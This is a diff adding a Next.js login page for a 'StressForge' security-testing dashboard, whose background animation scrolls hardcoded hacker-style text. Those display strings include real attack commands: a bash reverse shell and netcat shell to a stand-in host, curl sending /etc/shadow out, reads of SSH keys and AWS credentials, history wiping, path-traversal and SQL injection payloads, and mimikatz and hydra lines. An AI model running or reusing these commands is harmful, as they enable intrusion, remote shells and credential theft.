@@ -1,0 +1,434 @@
+"use client";
+
+import { useState } from "react";
+import { useRouter } from "next/navigation";
+import { useAuth } from "@/lib/auth-context";
+import { Zap, User, ArrowRight, Activity, Sun, Moon } from "lucide-react";
+
+
+const CODE_LINES_LEFT = [
+  "tcpdump -i eth0 -vvv -A 'port 80 or port 443'",
+  "nc -lvnp 4445 -e /bin/sh",
+  "gobuster dir -u https://target.local/ -w common.txt -t 50",
+  "[INFO] Threat Actor persistence module injected into /etc/cron.hourly/update-svc",
+  "[DATA_STEAL] Decrypting SSL proxy handshake vectors...",
+  "Session hijacked completely. Closing connection pipes safely.",
+  `   ██████╗ ██████╗ ██████╗ ███████╗    ██████╗ ██████╗  ██████╗ ██████╗ 
+  ██╔════╝██╔═══██╗██╔══██╗██╔════╝    ██╔══██╗██╔══██╗██╔═══██╗██╔══██╗
+  ██║     ██║   ██║██████╔╝█████╗      ██║  ██║██████╔╝██║   ██║██████╔╝
+  ██║     ██║   ██║██╔══██╗██╔══╝      ██║  ██║██╔══██╗██║   ██║██╔═══╝ 
+  ╚██████╗╚██████╔╝██║  ██║███████╗    ██████╔╝██║  ██║╚██████╔╝██║     
+   ╚═════╝ ╚═════╝ ╚═╝  ╚═╝╚══════╝    ╚═════╝ ╚═╝  ╚═╝ ╚═════╝ ╚═╝     
+  [!] CAUTION: INTRUSION COMPLIANCE TESTING & DATA EXTRACTION UNIT`,
+  "NMAP -sV -sC -Pn -T4 10.128.42.18",
+  "[!] Target OS: Linux Kernel 5.15.0-x86_64 (Ubuntu Enterprise)",
+  "GET /api/v2/auth/login HTTP/2",
+  "Host: api.target-internal.local",
+  "User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0",
+  "POST /api/v2/internal/fetch-report HTTP/1.1",
+  `{"document_id": "../../../../../etc/passwd\\u0000", "bypass_filter": true}`,
+  "[+] Local File Inclusion (LFI) vulnerability discovered on endpoint /fetch-report",
+  "SELECT usename, passwd FROM pg_shadow WHERE usename = 'postgres';",
+  `
+  ┌────────────────────────────────────────────────────────────────────────┐
+  │  [!] WARNING: EXFILTRATION RATIO EXCEEDS SENSITIVE METRICS THRESHOLD   │
+  └────────────────────────────────────────────────────────────────────────┘
+  `,
+  "[INFO] Spawning reverse TCP shell handler on port 4444...",
+  "sh -i >& /dev/tcp/10.10.14.5/4444 0>&1",
+  "python3 -c 'import pty; pty.spawn(\"/bin/bash\")'",
+  "whoami && id",
+  "uid=0(root) gid=0(root) groups=0(root)",
+  "[STAGE 2] Lateral movement initiated via automated SSH pivoting...",
+  "cat ~/.ssh/authorized_keys",
+  "cat /home/deploy/.aws/credentials",
+  `
+   _  _  _  _  ____  ____  _  _  __ _  ____   ____  _  _  ____  ____  ____  _  _ 
+  ( \\/ )/ )( \\(_  _)(  _ \\/ )( \\(  ( \\/ ___\\ (_  _)/ )( \\(_  _)(  __)(  _ \\/ )( \\
+  / \\/ \\) \\/ (  )(   )   /) \\/ (/    /\\___ \\   )(  ) __ (  )(   ) _)  )   /\\_  _/
+  \\_)(_/\\____/ (__) (__\\_)\\____/\\_)(_/\\____/  (__) \\_)(_/(__) (____)(__\\_)(__)  
+  [SYSTEM OVERRIDE IN PROGRESS - HOST: LOG_NODE_PRIMARY]
+  `,
+  "curl -X POST -d @/etc/shadow http://10.10.14.5:8000/loot/shadow.txt",
+  "SELECT credit_card_hash, cvv, expiry FROM billing.vault_records LIMIT 50000;",
+  "tar -czf - /var/www/html/secure_vault | openssl enc -aes-256-cbc -e -out vault.enc",
+  "[CRITICAL] Exfiltrating encrypted vault.enc to C2 server (185.220.101.4)...",
+  "GET /ws/c2/heartbeat?session=K3yL0gg3r_Active HTTP/1.1",
+  "Cookie: session_token=eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9...",
+  "hydra -L users.txt -P passwords.txt ssh://10.128.42.19 -t 4 -V",
+  "[ATTACK] SQLi payload triggered: ' UNION SELECT null,CONCAT(username,':',password) FROM users--",
+  "cat /proc/net/arp",
+  "arp-scan --interface=eth0 --localnet",
+  "[INFO] Hijacking active session cookie: _sess_id=cf83d298a1a39fbc812",
+  "ln -sf /dev/null ~/.bash_history && history -c",
+  `
+   _______  _______  ______  _______  __   __  _______  _______ 
+  |       ||       ||    _ ||_     _||  | |  ||       ||       |
+  |       ||   _   ||   | ||  |   |  |  | |  ||    _  ||_     _|
+  |       ||  | |  ||   |_||_ |   |  |  |_|  ||   |_| |  |   |  
+  |      _||  |_|  ||    __  ||   |  |       ||    ___|  |   |  
+  |     |_ |       ||   |  | ||   |  |       ||   |      |   |  
+  |_______||_______||___|  |_||___|  |_______||___|      |___|  
+  [!] COMPROMISED NODE BACKDOOR INSTALLED SUCCESSFULLY
+  `,
+  "tcpdump -i eth0 -vvv -A 'port 80 or port 443'",
+  "nc -lvnp 4445 -e /bin/sh",
+  "gobuster dir -u https://target.local/ -w common.txt -t 50",
+  "[INFO] Threat Actor persistence module injected into /etc/cron.hourly/update-svc"
+];
+
+const CODE_LINES_RIGHT = [
+  "tcpdump -i eth0 -vvv -A 'port 80 or port 443'",
+  "nc -lvnp 4445 -e /bin/sh",
+  "gobuster dir -u https://target.local/ -w common.txt -t 50",
+  "[INFO] Threat Actor persistence module injected into /etc/cron.hourly/update-svc",
+  "[DATA_STEAL] Decrypting SSL proxy handshake vectors...",
+  "Session hijacked completely. Closing connection pipes safely.",
+  `
+  ██████╗ ██████╗ ██╗   ██╗███████╗██████╗ ███████╗███████╗███████╗
+  ██╔══██╗██╔══██╗██║   ██║██╔════╝██╔══██╗██╔════╝██╔════╝██╔════╝
+  ██████╔╝██████╔╝██║   ██║█████╗  ██████╔╝█████╗  ███████╗█████╗  
+  ██╔═══╝ ██╔══██╗██║   ██║██╔══╝  ██╔══██╗██╔══╝  ╚════██║██╔══╝  
+  ██║     ██║  ██║╚██████╔╝███████╗██║  ██║███████╗███████║███████║
+  ╚═╝     ╚═╝  ╚═╝ ╚═════╝ ╚══════╝╚═╝  ╚═╝╚══════╝╚══════╝╚══════╝
+  [+] AUTOMATED SECURITY ASSESSMENT & DATABASE INTEGRITY FRAMEWORK`,
+  "[DEBUG] Port 22/tcp OPEN [OpenSSH 8.9p1]",
+  "[DEBUG] Port 80/tcp OPEN [nginx 1.18.0]",
+  "[DEBUG] Port 5432/tcp OPEN [PostgreSQL 14.2]",
+  "HTTP/2 403 Forbidden - Security Shield: Cloudflare WAF v4.0",
+  "HTTP/1.1 200 OK - Content-Type: application/octet-stream",
+  "[DUMP] root:x:0:0:root:/root:/bin/bash",
+  "[DUMP] postgres:x:114:122::/var/lib/postgresql:/bin/bash",
+  "[SUCCESS] Password hash captured: postgres:$6$rounds=40000$yG9... (SHA-512)",
+  "Connection received from 10.128.42.18 on port 4444",
+  `
+  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+  [SYSTEM SHIELD CRITICAL] RAM MALWARE INJECTION INJECTED AT CORRUPT REGISTER 0x0F8
+  ▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓▓
+  `,
+  "[STAGER] Meterpreter session 1 opened (10.10.14.5:4444 -> 10.128.42.18:59124)",
+  "[SYSINFO] Hostname: prod-db-server-01.internal",
+  "[!] Warning: EDR Agent 'DefendX' detected process anomalies.",
+  "[MUTING] EDR bypass injected successfully via memory unhooking (NtProtectVirtualMemory)",
+  "aws_access_key_id = AKIAIOSFODNN7EXAMPLE",
+  "aws_secret_access_key = wJalrXUtnFEMI/K7MDENG/bPxRfiCYEXAMPLEKEY",
+  "[DB_TEST] Query completed: 50,000 rows affected.",
+  "[DATA_STEAL] Chunk 01/20 uploaded successfully (SHA-256 matched)",
+  "[DATA_STEAL] Chunk 02/20 uploaded successfully (SHA-256 matched)",
+  "[DATA_STEAL] Data exfiltration stream active -> 4.2 MB/s",
+  `
+   _     ___   ____ _  _    ____  _  _  _  _  ____ 
+  ( )   / _ \\ / ___| )/ )  (  _ \\/ )( \\( \\/ )(  _ \\
+  ) (__  ()  ) )__  )  (    ) __/) __ ( )  (  ) __/
+  (____)\\___/ \\____(_)\\_)  (__)  \\_)(_/(_/\\_)(__)  
+  [LOCKDOWN BYPASS DETECTED - SPOOFING MAC MODULES]
+  `,
+  "[SUCCESS] SSH Brute Force matched credentials -> deploy:P@ssw0rd2026",
+  "HTTP/1.1 200 OK - Body: [admin:pbkdf2_sha256$260000$fG8a2x...]",
+  "Interface eth0: Found 12 live nodes in the internal private segment.",
+  "Injecting ARP cache poisoning vectors [10.128.42.1 -> 10.128.42.19]",
+  "[DEBUG] intercepting cleartext HTTP credentials from network broadcast...",
+  "[MEM_DUMP] Dumping lsass.exe process memory to C:\\Windows\\Temp\\debug.dmp",
+  "mimikatz # sekurlsa::logonpasswords",
+  "[*] Extracting NTLM Hash -> Administrator:514    :aad3b435b51404ee...",
+  "[CLEANUP] Deleting audit trails and shredding web logs...",
+  "[STATUS] Access maintained via persistent crontab backdoor. Attack Cycle Closed.",
+  `
+   _____  _    _  _____  _____  ______  _____  _____ 
+  /  ___)| |  | |/  ___)/  ___)|  ____)/  ___)/  ___)
+  | |___ | |  | || |___ | |___ | |__   | |___ | |___ 
+  \\___  \\| |  | |\\___  \\\\___  \\|  __)  \\___  \\\\___  \\
+  ____| || |__| |____| |____| || |____ ____| |____| |
+  \\_____/ \\____/ \\_____/\\_____/|______)\\_____/\\_____/
+  [CRITICAL BLOCK - ALL SYSTEM REPOSITORIES WIPED]
+  `,
+  "HTTP/1.1 503 Service Unavailable (Target down under heavy stress payload)",
+  "[DEBUG] Decrypting SSL proxy handshake vectors...",
+  "Session hijacked completely. Closing connection pipes safely."
+];
+
+export default function LoginPage() {
+  const [username, setUsername] = useState("");
+  const [isFocused, setIsFocused] = useState(false);
+  const [isDarkMode, setIsDarkMode] = useState(true);
+  const router = useRouter();
+  const { login } = useAuth();
+
+  const handleSubmit = (e: React.FormEvent) => {
+    e.preventDefault();
+    if (username.trim()) {
+      login(username.trim());
+      router.push("/dashboard");
+    }
+  };
+
+  const getLeftLineColor = (line: string) => {
+    if (line.includes("██") || line.includes("┌─") || line.includes("│") || line.includes("_  _")) {
+      return isDarkMode ? "text-emerald-500/80 font-bold" : "text-emerald-600/80 font-bold";
+    }
+    if (line.includes("_______") || line.includes("|       |")) {
+      return isDarkMode ? "text-teal-400 font-bold" : "text-teal-600 font-bold";
+    }
+    if (line.includes("[CRITICAL]") || line.includes("tar -czf") || line.includes("WARNING:")) {
+      return isDarkMode ? "text-rose-500 font-bold animate-pulse" : "text-rose-600 font-bold animate-pulse";
+    }
+    if (line.includes("[+]") || line.includes("uid=0")) {
+      return isDarkMode ? "text-green-400 font-semibold" : "text-green-600 font-semibold";
+    }
+    if (line.includes("SELECT") || line.includes("POST") || line.includes("GET")) {
+      return isDarkMode ? "text-cyan-400" : "text-cyan-600";
+    }
+    if (line.includes("[ATTACK]") || line.includes("[!]")) {
+      return isDarkMode ? "text-amber-400" : "text-amber-600";
+    }
+    return isDarkMode ? "text-slate-400/50" : "text-slate-400/80";
+  };
+
+  const getRightLineColor = (line: string) => {
+    if (line.includes("██") || line.includes("▓▓") || line.includes("_     _")) {
+      return isDarkMode ? "text-cyan-500/80 font-bold" : "text-cyan-600/80 font-bold";
+    }
+    if (line.includes("_____  _")) {
+      return isDarkMode ? "text-purple-400 font-bold" : "text-purple-600 font-bold";
+    }
+    if (line.includes("[DATA_STEAL]") || line.includes("[!]")) {
+      return isDarkMode ? "text-rose-500 font-bold" : "text-rose-600 font-bold";
+    }
+    if (line.includes("[SUCCESS]") || line.includes("[STATUS]")) {
+      return isDarkMode ? "text-emerald-400 font-bold" : "text-emerald-600 font-bold";
+    }
+    if (line.includes("[DUMP]") || line.includes("mimikatz")) {
+      return isDarkMode ? "text-amber-400" : "text-amber-600";
+    }
+    if (line.includes("[DEBUG]")) {
+      return isDarkMode ? "text-sky-400/80" : "text-sky-600/80";
+    }
+    return isDarkMode ? "text-slate-400/60" : "text-slate-400/90";
+  };
+
+  return (
+    <div className={`relative flex min-h-screen flex-col overflow-hidden transition-colors duration-300 ${isDarkMode ? "bg-slate-950" : "bg-slate-50"}`}>
+      {/* Background: Glow orbs + Code Stream */}
+      <div aria-hidden="true" className="pointer-events-none absolute inset-0 overflow-hidden">
+        {/* Glow Orbs */}
+        <div className={`absolute -top-40 left-1/2 h-[600px] w-[600px] -translate-x-1/2 rounded-full blur-[120px] transition-colors duration-300 ${isDarkMode ? "bg-emerald-600/10" : "bg-emerald-500/10"}`} />
+        <div className={`absolute bottom-0 left-0 h-[400px] w-[400px] -translate-x-1/2 translate-y-1/2 rounded-full blur-[100px] transition-colors duration-300 ${isDarkMode ? "bg-cyan-600/10" : "bg-cyan-500/10"}`} />
+        <div className={`absolute right-0 top-1/2 h-[350px] w-[350px] translate-x-1/2 -translate-y-1/2 rounded-full blur-[90px] transition-colors duration-300 ${isDarkMode ? "bg-rose-500/5" : "bg-rose-500/10"}`} />
+
+        {/* Animated Code Streams (Bucle denso, simétrico e infinito) */}
+        <div
+          className={`absolute inset-0 flex justify-between overflow-hidden font-mono text-[12px] leading-relaxed transition-opacity duration-300 ${isDarkMode ? "opacity-[0.35]" : "opacity-[0.22]"}`}
+          style={{
+            maskImage: "linear-gradient(to bottom, transparent, black 15%, black 85%, transparent)",
+            WebkitMaskImage: "linear-gradient(to bottom, transparent, black 15%, black 85%, transparent)"
+          }}
+        >
+          {/* Stream Left */}
+          <div className={`relative w-1/2 h-full overflow-hidden border-r ${isDarkMode ? "border-white/[0.02]" : "border-slate-900/[0.04]"}`}>
+            <div
+              className="absolute w-full flex flex-col"
+              style={{
+                animation: "scroll-code 55s linear infinite",
+                height: "200%"
+              }}
+            >
+              <div className="h-1/2 flex flex-col gap-3 justify-start pt-4">
+                {CODE_LINES_LEFT.map((line, i) => (
+                  <pre key={`l1-${i}`} className={`${getLeftLineColor(line)} whitespace-pre pl-6 tracking-wide`}>
+                    {line}
+                  </pre>
+                ))}
+              </div>
+              <div className="h-1/2 flex flex-col gap-3 justify-start pt-4" aria-hidden="true">
+                {CODE_LINES_LEFT.map((line, i) => (
+                  <pre key={`l2-${i}`} className={`${getLeftLineColor(line)} whitespace-pre pl-6 tracking-wide`}>
+                    {line}
+                  </pre>
+                ))}
+              </div>
+            </div>
+          </div>
+
+          {/* Stream Right */}
+          <div className="relative w-1/2 h-full overflow-hidden">
+            <div
+              className="absolute w-full flex flex-col items-end text-right"
+              style={{
+                animation: "scroll-code 60s linear infinite",
+                height: "200%"
+              }}
+            >
+              <div className="h-1/2 flex flex-col gap-3 justify-start pt-4 pr-6">
+                {CODE_LINES_RIGHT.map((line, i) => (
+                  <pre key={`r1-${i}`} className={`${getRightLineColor(line)} whitespace-pre tracking-wide`}>
+                    {line}
+                  </pre>
+                ))}
+              </div>
+              <div className="h-1/2 flex flex-col gap-3 justify-start pt-4 pr-6" aria-hidden="true">
+                {CODE_LINES_RIGHT.map((line, i) => (
+                  <pre key={`r2-${i}`} className={`${getRightLineColor(line)} whitespace-pre tracking-wide`}>
+                    {line}
+                  </pre>
+                ))}
+              </div>
+            </div>
+          </div>
+        </div>
+
+        {/* Grid pattern overlay */}
+        <div
+          className={`absolute inset-0 transition-opacity duration-300 ${isDarkMode ? "opacity-[0.02]" : "opacity-[0.03]"}`}
+          style={{
+            backgroundImage: isDarkMode
+              ? "linear-gradient(rgba(255,255,255,1) 1px, transparent 1px), linear-gradient(90deg, rgba(255,255,255,1) 1px, transparent 1px)"
+              : "linear-gradient(rgba(15,23,42,1) 1px, transparent 1px), linear-gradient(90deg, rgba(15,23,42,1) 1px, transparent 1px)",
+            backgroundSize: "40px 40px",
+          }}
+        />
+      </div>
+
+      {/* Top nav bar */}
+      <header className={`relative z-10 flex items-center justify-between border-b px-6 py-4 sm:px-10 backdrop-blur-md transition-colors duration-300 ${isDarkMode ? "border-white/5 bg-slate-950/40" : "border-slate-200/60 bg-white/60"}`}>
+        <div className="flex items-center gap-2.5">
+          <div className={`flex h-8 w-8 items-center justify-center rounded-lg shadow-lg ${isDarkMode ? "bg-emerald-500 shadow-emerald-500/20" : "bg-emerald-600 shadow-emerald-600/10"}`}>
+            <Zap className={`h-4 w-4 ${isDarkMode ? "text-slate-950" : "text-white"}`} />
+          </div>
+          <span className={`text-sm font-bold tracking-wider uppercase transition-colors duration-300 ${isDarkMode ? "text-white" : "text-slate-800"}`}>StressForge // SecSuite</span>
+        </div>
+
+        <div className="flex items-center gap-4">
+          {/* Light/Dark Mode Switcher Button */}
+          <button
+            onClick={() => setIsDarkMode(!isDarkMode)}
+            className={`p-2 rounded-xl border transition-all duration-200 hover:scale-105 ${isDarkMode
+                ? "border-white/10 bg-white/5 text-amber-400 hover:bg-white/10"
+                : "border-slate-200 bg-slate-100 text-purple-600 hover:bg-slate-200"
+              }`}
+            title={isDarkMode ? "Cambiar a Modo Blanco" : "Cambiar a Modo Oscuro"}
+          >
+            {isDarkMode ? <Sun className="h-4 w-4" /> : <Moon className="h-4 w-4" />}
+          </button>
+
+          <div className={`flex items-center gap-1.5 rounded-full border px-3 py-1.5 transition-colors duration-300 ${isDarkMode ? "border-emerald-500/20 bg-emerald-500/5" : "border-emerald-600/20 bg-emerald-5/80"}`}>
+            <Activity className={`h-3 w-3 animate-pulse ${isDarkMode ? "text-emerald-400" : "text-emerald-600"}`} />
+            <span className={`text-xs font-mono tracking-wide uppercase ${isDarkMode ? "text-emerald-400/90" : "text-emerald-700 font-medium"}`}>C2 Node Linked</span>
+          </div>
+        </div>
+      </header>
+
+      {/* Main content */}
+      <main className="relative z-10 flex flex-1 items-center justify-center p-6">
+        <div className="w-full max-w-md">
+          {/* Card */}
+          <div className={`overflow-hidden rounded-2xl border backdrop-blur-2xl transition-all duration-300 ${isDarkMode ? "border-white/10 bg-slate-900/[0.4] shadow-2xl shadow-black/80" : "border-slate-200 bg-white shadow-xl shadow-slate-200/50"}`}>
+            {/* Card top accent line */}
+            <div className="h-px w-full bg-gradient-to-r from-transparent via-emerald-500/40 to-transparent" />
+
+            <div className="p-8 sm:p-10">
+              {/* Header */}
+              <div className="mb-8">
+                <div className={`mb-5 inline-flex items-center gap-2 rounded-full border px-3 py-1.5 transition-colors duration-300 ${isDarkMode ? "border-rose-500/30 bg-rose-500/10" : "border-rose-200 bg-rose-50"}`}>
+                  <span className="h-1.5 w-1.5 rounded-full bg-rose-500 animate-ping" />
+                  <span className={`text-xs font-mono font-semibold uppercase tracking-widest ${isDarkMode ? "text-rose-400" : "text-rose-700 font-bold"}`}>
+                    Terminal Protegida
+                  </span>
+                </div>
+                <h1 className={`text-2xl font-bold tracking-tight sm:text-3xl font-mono transition-colors duration-300 ${isDarkMode ? "text-white" : "text-slate-900"}`}>
+                  Initialize Session
+                </h1>
+                <p className={`mt-2 text-sm transition-colors duration-300 ${isDarkMode ? "text-slate-400" : "text-slate-600"}`}>
+                  Por favor introduce tus credenciales criptográficas de operador para desplegar el entorno de testeo de vulnerabilidades.
+                </p>
+              </div>
+
+              {/* Form */}
+              <form onSubmit={handleSubmit} className="space-y-5">
+                <div className="space-y-1.5">
+                  <label
+                    htmlFor="username"
+                    className="block text-xs font-mono font-semibold uppercase tracking-widest text-slate-500"
+                  >
+                    Identificador de Operador / Token
+                  </label>
+                  <div
+                    className={`relative flex items-center rounded-xl border transition-all duration-200 ${isFocused
+                        ? isDarkMode
+                          ? "border-emerald-500/50 bg-emerald-500/5 shadow-[0_0_0_3px_rgba(16,185,129,0.1)]"
+                          : "border-emerald-500 bg-emerald-5/30 shadow-[0_0_0_3px_rgba(16,185,129,0.15)]"
+                        : isDarkMode
+                          ? "border-white/10 bg-white/5 hover:border-white/20"
+                          : "border-slate-200 bg-slate-50 hover:border-slate-300"
+                      }`}
+                  >
+                    <div className="pointer-events-none flex h-full items-center pl-3.5">
+                      <User
+                        className={`h-4 w-4 transition-colors duration-200 ${isFocused ? (isDarkMode ? "text-emerald-400" : "text-emerald-600") : "text-slate-500"}`}
+                      />
+                    </div>
+                    <input
+                      id="username"
+                      type="text"
+                      value={username}
+                      onChange={(e) => setUsername(e.target.value)}
+                      onFocus={() => setIsFocused(true)}
+                      onBlur={() => setIsFocused(false)}
+                      placeholder="ej. root, admin_sec..."
+                      className={`w-full bg-transparent py-3 pl-3 pr-4 text-sm font-mono outline-none transition-colors duration-300 ${isDarkMode ? "text-white placeholder-slate-600" : "text-slate-800 placeholder-slate-400"}`}
+                      autoFocus
+                      autoComplete="off"
+                    />
+                  </div>
+                </div>
+
+                <button
+                  type="submit"
+                  disabled={!username.trim()}
+                  className={`group relative flex w-full items-center justify-center gap-2.5 overflow-hidden rounded-xl px-4 py-3 text-sm font-semibold transition-all duration-200 disabled:cursor-not-allowed ${isDarkMode
+                      ? "bg-emerald-500 text-slate-950 shadow-lg shadow-emerald-500/20 hover:bg-emerald-400 hover:shadow-emerald-400/30 disabled:opacity-30 disabled:shadow-none"
+                      : "bg-emerald-600 text-white shadow-md shadow-emerald-600/10 hover:bg-emerald-500 hover:shadow-lg hover:shadow-emerald-500/20 disabled:opacity-40 disabled:shadow-none"
+                    }`}
+                >
+                  <span className="font-mono uppercase tracking-wider">Bypassing Gate / Acceder</span>
+                  <ArrowRight className="h-4 w-4 transition-transform duration-200 group-hover:translate-x-0.5" />
+                  <span
+                    aria-hidden="true"
+                    className="absolute inset-0 -translate-x-full skew-x-[-20deg] bg-white/10 transition-transform duration-700 group-hover:translate-x-[200%]"
+                  />
+                </button>
+              </form>
+
+              {/* Divider + info */}
+              <div className="mt-6 flex items-center gap-3">
+                <div className={`h-px flex-1 ${isDarkMode ? "bg-white/5" : "bg-slate-200"}`} />
+                <span className="text-xs font-mono text-slate-500 uppercase tracking-tight">Secured Bypass Mode</span>
+                <div className={`h-px flex-1 ${isDarkMode ? "bg-white/5" : "bg-slate-200"}`} />
+              </div>
+            </div>
+          </div>
+
+          {/* Capabilities badges */}
+          <div className="mt-6 flex flex-wrap justify-center gap-2">
+            {["Exploitation", "Data Dumping", "gRPC Pivoting", "SQL Injection Fuzzing"].map((tech) => (
+              <span
+                key={tech}
+                className={`rounded-full border px-3 py-1 text-[11px] font-mono font-medium uppercase tracking-tight shadow-sm transition-colors duration-300 ${isDarkMode ? "border-white/5 bg-slate-900/60 text-slate-500" : "border-slate-200 bg-white text-slate-600"}`}
+              >
+                {tech}
+              </span>
+            ))}
+          </div>
+        </div>
+      </main>
+
+      {/* Footer */}
+      <footer className={`relative z-10 border-t px-6 py-4 text-center backdrop-blur-md transition-colors duration-300 ${isDarkMode ? "border-white/5 bg-slate-950/20 text-slate-600" : "border-slate-200 bg-white/40 text-slate-500"}`}>
+        <p className="text-xs font-mono">
+          © 2026{" "}
+          <span className={`font-semibold ${isDarkMode ? "text-slate-500" : "text-slate-700"}`}>StressForge Labs</span>
+          {" · "} Auditoría de Redes Internas y Exfiltración Autorizada de Bases de Datos.
+        </p>
+      </footer>
+    </div>
+  );
+}
